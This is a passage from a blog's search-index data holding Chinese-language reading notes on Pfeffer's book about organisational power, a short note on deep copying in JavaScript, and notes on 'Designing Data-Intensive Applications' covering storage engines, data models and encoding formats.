nothing effects you until you agree to be affected.\n概論 為什麼需要權力\n有權力可以活更久、更健康 權力與身分地位可以讓人掌握自己的工作環境 不會感到壓迫、或是自己不能掌握 權力帶來能見度與地位，進而帶來財富 權力是領導的一部份，是完成事情的必須條件 有些競爭者會扭曲或是漠視公平競爭的遊戲規則，千萬不要對此抱怨或是希望世界不會有這種情形 你只要了解權力的原則，也願意運用，不管是哪一種組織，你都有辦法與人一較高下 權力無所不在 在動物社會中也有 身分地位會從一個環境【進口】到另一個環境 人會去維持階級存在 人會主動放棄權力以維持一個穩定的社會階級秩序 可以處理歧見 由老闆決定 讓大家去搶權力，權力大的決定 權力的代價\n備受關注並被放大檢視的壓力 這些檢視會讓公司與個人無法好好專住於工作 社會助漲效應: 就是類似上台前的緊張 對做簡單的事有幫助的 對做複雜的事是有害的 會有要時時保持【看起來還不錯】的壓力 所以應該要 低調行事 喪失自主權 失去自己的時間、個人與家庭生活 時間要花在培養權力相關的事務 (還有精力、專心一意) 不是每個人都可以信任 因為想要你的位置的人很多 權力會讓人上癮 失去權力的原因\n被權力沖昏頭 權力會讓人 給主動去爭取自己想要的結果 變的比較不【節制】，不遵守社會常規 過度自信 喜歡冒險 對他人無感 對別人有刻版印象 把別人視為滿足自己的工具 權力越大越會把團隊的成功當作是自己領導有方 過度信任他人 因為 過度自信、疲憊 而不察 如何看該不該信任? 看他的所有表現與行動 失去耐心、疲累 大環境改變，策略卻沒有變 當初會成功就是因為這個 (能幹的陷阱) 對權力依依不捨 追逐權力的三大障礙\n以為世界是公平的 (善有善報、惡有惡報) 而阻礙從各種情況與各種人(好或壞)身上學到教訓 微言人輕的你想取得權力，就必須注意權位者的動向 以為世界是公平的，而忘了權力是要靠自己主動打造 領導類書籍 這些書的處方只符合人心目中的世界，但這是幻想 這些書通常從成為CEO時寫起 沒有從基層爬到頂端的過程 為什麼這些書都十分單調、淺薄 CEO擅長凸顯自己，說人們想聽的話，彰顯自己的正面特質 有權力的人會去書寫歷史 彰顯自己的正面特質 以為世界是公平的，進而把所有正面的東西歸因到公司或是CEO，最後相信他們的建議是對的 自己 (自我設限) 為了保留自尊，不是先舉白旗投降，就是做些會阻礙自己的事 因為人都希望對自己滿意，或是不想起衝突 在挫敗發生時有可以責怪的對象 練習\n練習與行動要符合自己的情形、價值觀、目標 沒有萬用公式，留意身邊情況做練習 不要被動的學習，要主動做 小總結 權力 * 持有資源或位於中心且獨佔 * 可信任、穩固 (不用讓人思考) * follower會受益或是不會受傷\n分項論述 好表現不保證保得住權位，表現不好不見得會丟了飯碗\n只要讓老闆開心，工作表現好壞真的不是那麼重要 工作表現對考績的影響，不如主管對你的印象與你和他之間的關係 【我不會讓你走的，因為你表現得太好了】 把老闆惹毛了，工作表現好也救不了你 所以要? 替自己創造曝光(才不會忘記妳, 曝光效應) 上位者很忙不會知道你在做什麼，要讓他們知道 方法: 直接告訴他們 用對自己有利的方式衡量表現，或是凸顯好的表現 一再強調、一再堅持 這方面是好的，這是個好方法 強化上位者的自尊 永遠要記得老闆重視什麼 定期去問問上位者，看他們重視哪部份工作，與認為你應該做什麼 求助或是徵詢意見 之後照著做 讓他們自我感覺良好 人會喜歡自己，所以喜歡與自己相似的人 生日一樣、姓名相似\u0026hellip; 喜歡與自己同一組的人(ingroup bias) 討厭敵對的人(outgroup derogation) 如果上司犯錯，最好由他人指出來 (善用奉承) 人會自然喜歡說自己好話的人 【感覺被需要、被讚賞】 奉承是有來有往的 【在寄給他的感謝信寫上對我的讚美寄回來給我】 奉承失效? 到某個程度會失效，但研究數據中找不到是哪個程度 總而言之，就是 讓老闆有強烈慾望想讓你成功 所以才要讓老闆記住你、與有對應的好表現 維繫權力的特質\n相信自己是可以改變的 在校園應徵 裝扮的時髦有形、不失低調溫順 面試中散發果決能幹 對面試官表現十分尊重 讓動作傳達出我具有一定的權力 走向我時起身向前 直視他們的眼睛 主動與他們握手 坐姿稍有強勢意味 儘可能客觀檢視自己的長處與弱點 對自己的任何缺失，先是迴避，接著打死不認 方法: 不直接說過去那裡做對、哪裡做錯，而是往前看，說明應該做什麼才能面對未來的挑戰 不知道如何改進、要改什麼 方法: 問比自己厲害的人 知道打造權力基礎的最重要特質 意願(願意接受大挑戰) 雄心 非常渴望事業成功、專注於同一個目標 才能克制情緒 不去在意別人 忍受不好的環境 精力 無時無刻投入想完成的事或工作 精力與其他情緒一樣有感染力，會激發別人讓別人更努力 能長時間投入，更有利於事情的達成 容易被promote，也會被認為忠誠度較高 專一 專注於同一產業、公司 get domain knowleage與專業人脈 專注於同一技能的學習 專注於工作中最重要的部分，最能彰顯事情完成與否、別人對你的工作效能的管感 才能(具備必要的能力把雄心轉化為成就) 自我充實與反省心態 在重大會議或是談話結束，會在小筆記上把 順利與不順利的部分記錄下來 也記下別人說的話、做的事與會議結果 全神投入、作筆記、思考自己在做什麼 有把握與散發自信 不管什麼情況，別人都會搞清楚應不應該把你當一回事 因此你要有掌控全局能力 人在判斷權力大小與要不要順從時，會看對方的一舉一動 有權力 =\u0026gt; 有自信 人會自動做逆向關聯 有自信 =\u0026gt; 有權力 能解讀他人與理解他們的看法 站在對方的利益來談、來想 不能只在乎最終目標，要記得尋求他人的支持 有容忍(不畏懼)衝突的能力 人不喜歡衝突，故 常常會對於別人提出的要求照單全收 改變自己的立場 聰明反而是被高估的!! 不會與人合作 過度自信、自大 不顧別人感受與需求 起點 (部門)\n重要性\n在權力大的部門的主管，換工作時比較可能會繼續待在權力大的部門 有影響力的部門\n有凝聚力 透過例行公事: 準備簡報、收集資料 傳授專業技能與知識 打造溝通與信任的共同連結，分享彼此經驗 有能力提供關鍵資源 或 有能力解決關鍵的組織問題 從CEO的出身背景可以看出權力的移轉現況 1900年代: 創辦人 1920~1930: 業務與行銷 1960~1980: 財務 衡量部門權力的要素\n相對薪資高 辦公地點接近核心、設備新穎 這點代表 權力大 因距離靠近，而影響力增加 高層團隊的出身背景 (from 哪個部門的人多) 選擇未知的風險或是激烈的競爭?\n端看個人的風險承受能力 成為最引人注目的那一個\n擺脫想要人見人愛的想法 人見人愛、討人喜歡不是通往權力的必要條件，但有權力就會被人喜歡 只要你有權力，也願意用權力，人就會靠近你 一是害怕被你傷害 另一是需要你來獲取成功 除了魅力與能力，別人也會看有沒有勝算決定要不要支持你 不是因為喜歡你才聯絡 【他對你有沒有幫助?】 行為決定看法 (人可以對行為做出詮釋) 如果以某種方式行事，久而久之看法就會變成那個樣子 如果需要對手的幫助而對她友善，久而久之會感覺與他的關係真的變友善了 【大家都希望受人喜愛與受人畏懼，但如果要選，想要權力就選受人畏懼】 人會從兩個角度來判斷別人 親切 好人會被視為親切，但是好心常常給人軟弱的印象，甚至卻乏智慧 能力 想要看起來有能力，要兇悍與刻薄一點 人總是容易忘記 人會忘記別人的傷害或輕蔑 尤其是跟他們繼續往來會更容易忘記 即使是最不合的兩人也可能因長期往來而變成好友 主動要求 最糟就是被拒絕而已 別低估說不的代價 拒絕別人的要求，其實違背【行善】的社會準則 當場會很尷尬 能強化對方的權勢地位 怎麼要求幫忙 表現出你知道他們的重要性、成就 (經歷好、能力好\u0026hellip;) 讓對方知道我們有共同點 (同學校、同個月生日\u0026hellip;) 在得到名人幫助後能再利用名人的名聲，拉到更多人幫忙 所以要廣 別怕引人注目 如果希望別人把拔擢，就要先讓他們注意到你 要做些能凸顯自己的事 (建立個人品牌、推銷自己、不要害羞) 季辛吉喜歡擺出資深教授的架式，同學不喜歡，但打響名號，因為行為與眾不同 規則往往對制定規則的人有利，而制定規則的人往往都是已經握有權力的人 如果已經大權在握 一定要照規則來玩，還要鼓勵大家都照規則來 如果還在拚權力 傳統觀念與照規則的話，聽聽就好 資源\n定義 就是人們想要或是需要的東西 $、工作、訊息、社會支援、友誼、工作上的協助 要點 只要掌握金錢與工作的流向，自然就會有權利 選工作時，要挑能直接控制預算(能決定公司營收的第一線工作)或是人員的職位 職位與職位隨之而來的資源，會是權力的來源 資源與權力息息相關 CEO的薪水其實與公司規模掛勾，而不是工作表現 建立權力基礎就是 一點一點累積影響力與資源的過程 要能 看出別人沒有看到的機會 自己創造機會 有耐心與堅持來貫徹這些機會 創造資源 給予關心與支持 例子 參加他的生日宴會、共進午餐、生病或家人生病去探望 給他們機會談論自己 去參加對別人來說重要的活動 做重要的小事 人會感激有人幫他們做一部份工作 尤其是無趣又瑣碎的工作 人很懶或沒興趣做看似微不足道的小事 收集高層可能想知道的資料，讓上層刮目相看 讓自己不可或缺 問到不知道的問題先假裝懂一些，之後去查再回答 善用機會建立資源、利用關係居中牽線 參與舉辦活動(集會、演講、讓人互相認識交流或學習)的事務 主動發起活動 人脈\nmethods\n接觸 內部 (*) 在公司活動認識人 外部 參加與工作相關的活動 維繫 內部 去了解其他部門在做什麼 外部 (*) 請別人代我向公司以外有公事往來的朋友問好 善用 內部 在與其他同事往來時探聽公事上的機密 外部 與其他公司的人交換專業上的竅門與意見 來源\n內部 外部 結交人脈最重要方式是\n與內部接觸 維繫外部人脈 打造人脈需要的不是時間，而是規劃\n列出想認識或必須認識的人或組職 找對的人 因為打造人脈需要時間 不緊密的人脈比較有用 可以帶來新的生活圈與經驗 要滿足兩個前提才有用 他有能力把你與其他多元的人脈串聯起來 他有意願這麼做 認識不同圈子的人、地理位置要分散、不一定要與這些人很熟 可以成立一個組織，這樣地位高的也可以參加 照名單意義努力去結交 拜託別人引薦 事後再寄感謝函 提供訊息與人脈給新認識的人 想辦法與更廣泛、更多元的人交往 別老是與同樣的人來往 讓自己處於訊息溝通的中心 (結構上的、地理上的) 在人脈網中位階較高者，就要充當各個不同組織之間的橋樑 怎麼看是不是中心? 看在其他人心中的分量為何 你是不是尋求建議或是幫助的對象 看有多少溝通是經過自己的 演說\n路人如果看到某人不否認或不逃避自己的所作所為 通常會認為此人不認為自己有罪或是羞愧 所以會認為 或許真的不是他的錯 例子: 【是我\u0026hellip;】 【強調一切都是自己一手掌握】 這就是說我是主導者 (我有權力!!) 表達憤怒通常比表達悲傷、愧疚或懊悔，更具權威 演的原則 表現出有自信的樣子，即使不知道自己在做什麼 一部份靠自律、一部份靠假裝，到最後假裝會成真 注意觀眾的感受，表現對的感受 (行為、表情、情緒\u0026hellip;) 不論自己多累，要確保在觀眾前面是對的形象 表達憤怒而非悲傷、愧疚或懊悔 生氣的人會被視為身分地位高 別人也會比面與你正面衝突 難過會被視為身分地位低 肢體語言 注意外表 筆直站挺 抬頭挺胸 正面朝向別人 直視別人眼睛 手勢要簡短有力 不要過長 不要雙手繞圈、擺動手臂 利用回憶喚起想要的情緒 在展現當下沒有的情緒時需要 (像沒把握時展現自信) 架設舞台並好好安排情境 大辦公室 =\u0026gt; 氣派、專業 回答時要慢慢來 (別在謊張時或是還沒把握就開口) 顯整理好思緒，停頓良久才開始說話 說的原則 打斷別人的話 打斷別人的話是一種權力的象徵 counter: 【讓我說完】，之後繼續說 奪下議題主導權 議事的權力面貌 誰的觀點贏 議題由誰設定 這決定有哪些議題會被討論 議題與結果是由人際互動決定，人際互動的規則由誰決定 質疑與挑戰對方的基本假設 有說服力的語言 能夠創造出權威形象，而且情緒勝過理智 明確具體且充滿力量與畫面 技巧 利用敵我意識 以停頓來加強語氣，並尋求贊同甚至掌聲 列舉3點或是條列式的方式來演講 利用對比，且詞句對仗、字數相同 不要看講稿與小抄 適度運用幽默 樹立名聲\n早點樹立良好形象 因為第一印象的形成很快且難以撼動，故 如果發現自己處於一個有形象危機的情境，人們對你沒有正面評價(不管什麼原因) 上上策通常都是離開，另尋機會、新的環境 應該現身於各種場合，以量取勝 (因為第一印象的形成，像對不對味等自己無法控制) 謹慎勾勒出你想要的形象 利用媒體增加能見度並擦亮你的形象 提供文章到媒體培養credit 與媒體相處: 做個好親近的人，樂意提供協助 get高位後，找人把你討人喜歡的故事寫出來 讓別人對你歌功頌德並巧妙釋出一些有關自己負面但不致命的訊息 即便別人知道這人可能是受你控制(像花錢)，但相較於自吹自儡，這樣人對你的評價還是比較高 所以 花$讓別人來代表你，推銷你 只要你的怪癖與你樹立的形象、名聲無關，就ok 有人還會因為這樣去看中你，更樂見你成功 打預防針 讓用你的與支持你的人充分了解你的缺點但還是願意與你合作 應對衝突\n【衝突正是認識對方的機會】 善待對手、讓對方台階下 越是壓制、他們越想拿到權力與反抗；搞到對方一無所有，對方就會想拚死一搏 吸納對手 像 安排一個新部門讓他們處理他們的問題 (策略性的安排職位、安插到更好的職位) 這樣權責就逆轉了，原本是我們要做的事就變成他們要做 也顧到對方的面子 不要給自己製造不必要的麻煩 強烈情緒會影響思考 要一直問 【什麼狀況叫做勝利?如果已經勝利，你希望勝利帶來什麼?】 專心投入 像是讀書時如果get不到，頭就要一直記憶與比對，造成頭昏 這時就要去找這段的目的是什麼、假設是什麼等等邏輯立論時需要的東西 與關鍵人物保持良好關係 為了完成目標，要放下任何妨礙你建立關係的情緒 把焦點放在資料上，就事論事 有關手法 常常去對方的辦公室坐坐 讓對方知道自己在幹什麼、為什麼這麼做 讓對方參與決策 堅持到底 堅持可以削弱反對力道 堅持可以等到情勢逆轉的時刻 多方並進 地方難以推動，就建立全國的名聲；之後就可以回來推動地方 抓到時機主動出擊 如果行動夠快，通常可以趁對手不備、不清楚狀況時勝券在握 賞友罰敵 用遠大的理想包裝目標 把自己的目標與社會上的價值串聯起來 挫敗不可怕\n問題是如何復原、能不能復原 要點 決不放棄 不要覺得挫敗很難堪，是自己的錯 要做的事: 把事情的來龍去脈說給越多人越好 繼續作能讓你成功的事 不要輕易放棄原有的領域 (轉行) 表現出權威與成功的樣子 外人判斷的依據之一 你的表現方式 看起來樂觀? 表現出權威與成功的樣子? 人都會想與贏家攀上關係 例子 讓其他成員見識他的價值 拿出數據告訴小組這個市場並非明智之舉 讓小組認為他有點東西 告訴小組他有其他高薪工作 讓其他人看得起他 讓人知道若要離開不是隨便說說的 讓其他人做他擅長的事 讓他們知道這工作不是想像的簡單 與其他人爭位 自己介紹其他人認識可能去取代的人選 ","permalink":"https://littlebees.github.io/2022/01/powerwhy-some-people-have-it-and-others-dont/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe idea is nothing effects you until you agree to be affected.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"Power：Why Some People Have It and Others Don’t"},{"content":"動機 當你以為deep copy是正常的builtin時，Javascript總是能給你驚喜\n當初我以為 Object其實是hash table，所以拿來放function key很合理(又都是指到同一個function) 用console.log看的到 hash table如果被deep copy應該要對key, values做deep copy deep copy是基本功能 實際上 沒有deep copy google後大部分會說用JSON.stringify 用Object.entries不會出現function key console.log不是有出現嗎!? function key不會出現在JSON.stringify中!! 用Object.assign({},obj)之類的，可以處理function key Object.assign({},obj)不會deepcopy!! (shallow copy) structuredClone但要看版本，夠新才會有，polyfill的可能有毛病 用套件lodash - cloneDeep ","permalink":"https://littlebees.github.io/2022/01/%E5%9C%A8javascript%E5%81%9Adeep-copy/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當你以為deep copy是正常的builtin時，Javascript總是能給你驚喜\u003c/p\u003e","title":"在javascript做deep copy?"},{"content":"動機 不可多得的一本書，把所有與DB與distrubuted computing的手法與議題都說了一遍\n有簡中翻譯\n第一章 可靠性，可伸縮性，可維護性 應用分成\n數據密集型的，如果數據是其主要挑戰 計算密集型，即處理器速度是其瓶頸 這裡談數據密集型，他們會需要\n存儲數據，以便自己或其他應用程序之後能再次找到 （數據庫，即 databases） 記住開銷昂貴操作的結果，加快讀取速度（緩存，即 caches） 允許用戶按關鍵字搜索數據，或以各種方式對數據進行過濾（搜索索引，即 search indexes） 向其他進程發送消息，進行異步處理（流處理，即 stream processing） 定期處理累積的大批量數據（批處理，即 batch processing） 有3個重點\n可靠性（Reliability） 系統在困境（adversity，比如硬件故障、軟件故障、人為錯誤）中仍可正常工作（正確完成功能，並能達到期望的性能水準） 正常工作 可靠性粗略理解為“即使出現問題，也能繼續正確工作” 設計容錯機制以防因故障而導致失效 故障通常定義為系統的一部分狀態偏離其標準 失效則是系統作為一個整體停止向用戶提供服務 通過故意觸發來提高故障率是有意義的 例如：在沒有警告的情況下隨機地殺死單個進程。 許多高危漏洞實際上是由糟糕的錯誤處理導致的 Netflix公司的Chaos Monkey 比起阻止錯誤（prevent error），我們通常更傾向於容忍錯誤 硬件故障 為了減少系統的故障率，第一反應通常都是增加單個硬件的冗余度 硬件冗余對於大多數應用來說已經足夠了，它使單台機器完全失效變得相當罕見 只要你能快速地把備份恢覆到新機器上，故障停機時間對大多數應用而言都算不上災難性的 但是隨著數據量和應用計算需求的增加，越來越多的應用開始大量使用機器，這會相應地增加硬件故障率 類似亞馬遜AWS（Amazon Web Services）的一些雲服務平台上，虛擬機實例不可用卻沒有任何警告也是很常見的 雲平台的設計就是優先考慮靈活性（flexibility） 和彈性（elasticity），而不是單機可靠性 軟件錯誤 例子 接受特定的錯誤輸入，便導致所有應用服務器實例崩潰的BUG。例如2012年6月30日的閏秒 失控進程會用盡一些共享資源，包括CPU時間、內存、磁盤空間或網絡帶寬 軟件故障的BUG通常會潛伏很長時間，直到被異常情況觸發為止。 這種情況意味著軟件對其環境做出了某種假設 雖然這種假設通常來說是正確的，但由於某種原因最後不再成立了 軟件中的系統性故障沒有速效藥，但我們還是有很多小辦法 仔細考慮系統中的假設和交互；徹底的測試；進程隔離；允許進程崩潰並重啟；測量、監控並分析生產環境中的系統行為。 如果系統能夠提供一些保證（例如在一個消息隊列中，進入與發出的消息數量相等），那麽系統就可以在運行時不斷自檢 人為錯誤 以最小化犯錯機會的方式設計系統 精心設計的抽象 如果接口限制太多，人們就會忽略它們的好處而想辦法繞開 將人們最容易犯錯的地方與可能導致失效的地方解耦（decouple） 特別是提供一個功能齊全的非生產環境沙箱（sandbox） 在各個層次進行徹底的測試 允許從人為錯誤中簡單快速地恢覆，以最大限度地減少失效情況帶來的影響 配置詳細和明確的監控，比如性能指標和錯誤率 可伸縮性（Scalability） 有合理的辦法應對系統的增長（數據量、流量、覆雜性）。 描述負載 在討論增長問題（如果負載加倍會發生什麽？）前，首先要能簡要描述系統的當前負載 參數的最佳選擇取決於系統架構 (例子) 每秒向Web服務器發出的請求 數據庫中的讀寫比率 聊天室中同時活躍的用戶數量 緩存命中率或其他東西 描述性能 一旦系統的負載被描述好，就可以研究當負載增加會發生什麽 增加負載參數並保持系統資源（CPU、內存、網絡帶寬等）不變時，系統性能將受到什麽影響？ 增加負載參數並希望保持性能不變時，需要增加多少系統資源？ 例子 批處理系統，通常關心的是吞吐量（throughput） 理想情況下，批量作業的運行時間是數據集的大小除以吞吐量。 在實踐中由於數據傾斜（數據不是均勻分布在每個工作進程中），需要等待最慢的任務完成，所以運行時間往往更長 對於在線系統，通常更重要的是服務的響應時間（response time） 響應時間可能會有很大差異。 因此我們需要將響應時間視為一個可以測量的數值分布（distribution） 而不是單個數值 百分位點（percentiles） 然而如果你想知道“典型（typical）”響應時間，那麽平均值並不是一個非常好的指標 因為它不能告訴你有多少用戶實際上經歷了這個延遲 選50百分點(中位數) 為了弄清異常值有多糟糕，可以看看更高的百分位點，例如第95、99和99.9百分位點 響應時間的高百分位點（也稱為尾部延遲，即tail latencies）非常重要，因為它們直接影響用戶的服務體驗 排隊延遲（queueing delay） 通常占了高百分位點處響應時間的很大一部分。 由於服務器只能並行處理少量的事務（如受其CPU核數的限制） 只要有少量緩慢的請求就能阻礙後續請求的處理，這種效應有時被稱為 頭部阻塞（head-of-line blocking） 可維護性（Maintainability） 許多不同的人（工程師、運維）在不同的生命周期，都能高效地在系統上工作（使系統保持現有行為，並適應新的應用場景） 可操作性：人生苦短，關愛運維 deploy, monitor, update, nice infra, predictable 簡單性：管理覆雜度 覆雜度 額外覆雜度 由具體實現中湧現，而非（從用戶視角看，系統所解決的）問題本身固有的覆雜度 消除額外覆雜度的最好工具之一是抽象（abstraction） 一個好的抽象可以將大量實現細節隱藏在一個幹凈，簡單易懂的外觀下面 可演化性：擁抱變化 第二章 數據模型與查詢語言 數據模型們的影響如此深遠：不僅僅影響著軟件的編寫方式，而且影響著我們的解題思路\n多數應用使用層層疊加的數據模型構建。 對於每層數據模型的關鍵問題是：它是如何用低一層數據模型來表示的\n關系模型 scenario 事務處理 批處理 對象關系不匹配 如果數據存儲在關系表中，那麽需要一個笨拙的轉換層，處於應用程序代碼中的對象和表，行，列的數據庫模型之間 一對多的關系 (適合文件型) SQL的作法 正規化與外鍵 放JSON 在col中 encode成string 文件的做法 用JSON存 JSON表示比正規化與外鍵的多表模式具有更好的局部性（locality 多對一和多對多的關系 (適合SQL) 會共用資料!! 用一個ID代表共用資料 各個簡介之間樣式和拼寫統一 避免歧義（例如，如果有幾個同名的城市） 易於更新——名稱只存儲在一個地方，如果需要更改（例如，由於政治事件而改變城市名稱），很容易進行全面更新。 本地化支持——當網站翻譯成其他語言時，標準化的列表可以被本地化，使得地區和行業可以使用用戶的語言來顯示 更好的搜索——例如，搜索華盛頓州的慈善家就會匹配這份簡介，因為地區列表可以編碼記錄西雅圖在華盛頓這一事實（從“Greater Seattle Area”這個字符串中看不出來） ID對人類沒有任何意義，因而永遠不需要改變：ID可以保持不變，即使它標識的信息發生變化。 SQL的作法 正規化與外鍵 文件的做法 進行多個查詢來模擬join 複製到每個有連到的地方 (反正規) 即便應用程序的最初版本適合無連接的文檔模型，隨著功能添加到應用程序中，數據會變得更加互聯 文檔模型 \u0026amp; 關系模型 關系模型 為連接提供更好的支持 支持多對一和多對多的關系 文檔模型 架構靈活性 大多數文檔數據庫以及關系數據庫中的JSON支持都不會強制文檔中的數據采用何種模式 沒有模式意味著可以將任意的鍵和值添加到文檔中 (讀時模式（即schema-on-read) 當讀取時，客戶端對無法保證文檔可能包含的字段 因為讀取數據的代碼通常假定某種結構——即存在隱式模式，但不由數據庫強制執行 集合中的項目並不都具有相同的結構時,讀時模式更具優勢 SQL在改schema時需要migration 因局部性而擁有更好的性能 局部性僅僅適用於同時需要文檔絕大部分內容的情況 因此，通常建議保持相對小的文檔，並避免增加文檔大小的寫入 對於某些應用程序而言更接近於應用程序使用的數據結構 圖數據模型 關系模型可以處理多對多關系的簡單情況 但是隨著數據之間的連接變得更加覆雜，將數據建模為圖形顯得更加自然 特點 任何頂點都可以有一條邊連接到任何其他頂點。沒有模式限制哪種事物可不可以關聯。 給定任何頂點，可以高效地找到它的入邊和出邊，從而遍歷圖，即沿著一系列頂點的路徑前後移動。 通過對不同類型的關系使用不同的標簽，可以在一個圖中存儲幾種不同的信息，同時仍然保持一個清晰的數據模型。 第三章：存儲與檢索 程序員\n數據模型: 將數據錄入數據庫的格式 查詢語言: 再次要回數據的機制 數據庫\n索引與物化視圖:如何在我們需要時重新找到數據\n編碼(第四章)與儲存方式: 數據庫如何存儲我們提供的數據\n驅動數據庫的數據結構\nkey \u0026amp; value 索引（index）\n為了高效查找數據庫中特定鍵的值 任何類型的索引通常都會減慢寫入速度 因為每次寫入數據時都需要更新索引 種類 hash index 保留一個內存中的散列映射，其中每個鍵都映射到數據文件中的一個字節偏移量 在硬盤上通過一次硬盤查找操作來加載所需部分 (seek) 有新index就直接append這update記錄到log去 (持久化) 將日志分為特定大小的段（segment） 當日志增長到特定尺寸時關閉當前段文件，並開始寫入一個新的段文件 對這些段進行壓縮（compaction） 關於log要考慮 文件格式 CSV不是日志的最佳格式。使用二進制格式更快，更簡單 刪除記錄 如果要刪除一個鍵及其關聯的值，則必須在數據文件中追加一個特殊的刪除記錄(邏輯刪除) 當日志段被合並時，合並過程會通過這個墓碑知道要將被刪除鍵的所有歷史值都丟棄掉 崩潰恢覆 你可以通過從頭到尾讀取整個段文件並記錄下來每個鍵的最近值來恢覆每個段的散列映射 (如果太大) 每個段的散列映射的快照存儲在硬盤上來加速恢覆，可以使散列映射更快地加載到內存中 部分寫入記錄 數據庫隨時可能崩潰，包括在將記錄追加到日志的過程中 校驗和，允許檢測和忽略日志中的這些損壞部分 並發控制 由於寫操作是以嚴格的順序追加到日志中的，所以常見的實現是只有一個寫入線程 數據文件段是僅追加的或者說是不可變的，所以它們可以被多個線程同時讀取 log只append的好處 追加和分段合並都是順序寫入操作，通常比隨機寫入快得多 如果段文件是僅追加的或不可變的，並發和崩潰恢覆就簡單多了 合並舊段的處理也可以避免數據文件隨著時間的推移而碎片化的問題 缺點 散列表必須能放進內存 範圍查詢效率不高 SSTables和LSM樹 前提 要求log的鍵值對的序列按鍵排序 在mem用AVL tree 等size夠大就dump到log 要求每個鍵只在每個合並的段文件中出現一次 崩潰恢覆 多一個操作log (超常見手法) 好處 即使文件大於可用內存，合並段的操作仍然是簡單而高效的 為了在文件中找到一個特定的鍵，你不再需要在內存中保存所有鍵的索引 可以在mem存一個一個區段，之後就是在對的區段直接掃描 由於讀取請求無論如何都需要掃描所請求範圍內的多個鍵值對，因此可以將這些記錄分組為塊（block），並在將其寫入硬盤之前對其進行壓縮 省空間、io 缺點 當查找數據庫中不存在的鍵時，LSM樹算法可能會很慢 使用額外的布隆過濾器（Bloom filters） 告訴DB是不是不存在某個鍵 B樹 具有n個鍵的B樹總是具有 O(log n) 的深度 崩潰恢覆 B樹的基本底層寫操作是用新數據覆寫硬盤上的頁面 B樹實現通常會帶有一個額外的硬盤數據結構 預寫式日志（WAL，即write-ahead log） (超常見手法) 優化 使用寫時覆制 (持久化) 我們可以通過不存儲整個鍵，而是縮短其大小，來節省頁面空間 盡量使葉子頁面按順序出現在硬盤上 LSM樹在合並過程中一次又一次地重寫存儲的大部分，所以它們更容易使順序鍵在硬盤上彼此靠近 額外的指針已被添加到樹中 每個葉子頁面可以引用其左邊和右邊的兄弟頁面 使得不用跳回父頁面就能按順序對鍵進行掃描 比較B樹和LSM樹 通常LSM樹的寫入速度更快，而B樹的讀取速度更快 LSM樹上的讀取通常比較慢，因為它們必須檢查幾種不同的數據結構和不同壓縮（Compaction）層級的SSTables LSM樹的優點 較低的寫放大 \u0026amp; 更高的寫入吞吐量 寫放大: 在數據庫的生命周期中每次寫入數據庫導致對硬盤的多次寫入 B樹索引中的每塊數據都必須至少寫入兩次 一次寫入預先寫入日志（WAL） 一次寫入樹頁面本身 由於反覆壓縮和合並SSTables，日志結構索引也會多次重寫數據 順序地寫入緊湊的SSTable文件而不是必須覆寫樹中的幾個頁面 LSM樹可以被壓縮得更好，因此通常能比B樹在硬盤上產生更小的文件 LSM樹的缺點 壓縮過程有時會幹擾正在進行的讀寫操作 日志結構化存儲引擎在更高百分位的響應時間（請參閱“描述性能”）有時會相當長 B樹的行為則相對更具可預測性 在高寫入吞吐量時：硬盤的有限寫入帶寬需要在初始寫入（記錄日志和刷新內存表到硬盤）和在後台運行的壓縮線程之間共享 在B樹索引中，這些鎖可以直接附加到樹上 B樹的一個優點是每個鍵只存在於索引中的一個位置 日志結構化的存儲引擎可能在不同的段中有相同鍵的多個副本 物化視圖\n一個類似於表的對象，其內容是一些查詢或是aggregate func(sum,min)的結果 使得寫入成本更高 當底層數據發生變化時，物化視圖需要更新 多維度: 數據立方體或OLAP立方 事務處理和分析系統\n數據倉庫\n一個獨立的數據庫，分析人員可以查詢他們想要的內容而不影響OLTP操作 數據倉庫包含公司各種OLTP系統中所有的只讀數據副本 抽取-轉換-加載（ETL） 從OLTP數據庫中提取數據（使用定期的數據轉儲或連續的更新流），轉換成適合分析的模式，清理並加載到數據倉庫中。將數據存入倉庫的過程 分析的模式 星型模式 在模式的中心是一個所謂的事實表 事實表的每一行代表在特定時間發生的事件 事實被視為單獨的事件，因為這樣可以在以後分析中獲得最大的靈活性 事實表可以變得非常大、寬 做列式存儲 列式存儲\n方法 將來自每一列的所有值存儲在一起 每個列式存儲在一個單獨的文件中 這樣row的寫入會變得麻煩 =\u0026gt; LSM樹 所有的寫操作首先進入一個內存中的存儲，在這里它們被添加到一個已排序的結構中，並準備寫入硬盤 好處 查詢只需要讀取和解析查詢中使用的那些列 這可以節省大量的工作 還可以做列壓縮 值域通常重複 比起用row去讀用col去讀可以用SIMD優化 可以對col排序達成類似index與壓縮的效果 第一個排序鍵的壓縮效果最強 第二和第三個排序鍵會更混亂 把用不同col排的資料分散到不同DB!! 第四章：編碼與演化 可演化性: 有些舊有些新，但都可以動\n服務端（server-side） 滾動升級 （rolling upgrade） 客戶端（client-side） 升不升級就要看用戶的心情了 雙向兼容性\n向後兼容 (backward compatibility)\n新代碼可以讀舊數據。 easy 向前兼容 (forward compatibility)\n舊代碼可以讀新數據。 舊版的程序需要忽略新版數據格式中新增的部分!! 編碼數據的格式\n程序通常（至少）使用兩種形式的數據 在內存中，數據保存在對象 如果要將數據寫入文件，或通過網絡發送，則必須將其 編碼（encode） 為某種自包含的字節序列 語言特定的格式 這類編碼通常與特定的編程語言深度綁定，其他語言很難讀取這種數據 解碼過程需要實例化任意類的能力，這通常是安全問題的一個來源 數據版本控制通常是事後才考慮的 因為它們旨在快速簡便地對數據進行編碼，所以往往忽略了前向後向兼容性帶來的麻煩問題 效率（編碼或解碼所花費的CPU時間，以及編碼結構的大小）往往也是事後才考慮的 JSON, XML \u0026hellip; 數值（numbers） 的編碼多有歧義之處 XML和CSV不能區分數字和字符串 JSON雖然區分字符串與數值，但不區分整數和浮點數，而且不能指定精度 JSON和XML對Unicode字符串（即人類可讀的文本）有很好的支持，但是它們不支持二進制數據 沒有type做保證 (有也很難用或是沒統一) 二進制編碼 Thrift與Protocol Buffers Thrift和Protocol Buffers每一個都帶有一個代碼生成工具，它采用了類似於這里所示的模式定義，並且生成了以各種編程語言實現模式的類 都可以設定 optional args的index type args的index 與 兼容性 編碼的記錄就是其編碼字段的拼接 每個字段由其標簽號碼（樣本模式中的數字1,2,3）標識 用數據類型（例如字符串或整數）注釋 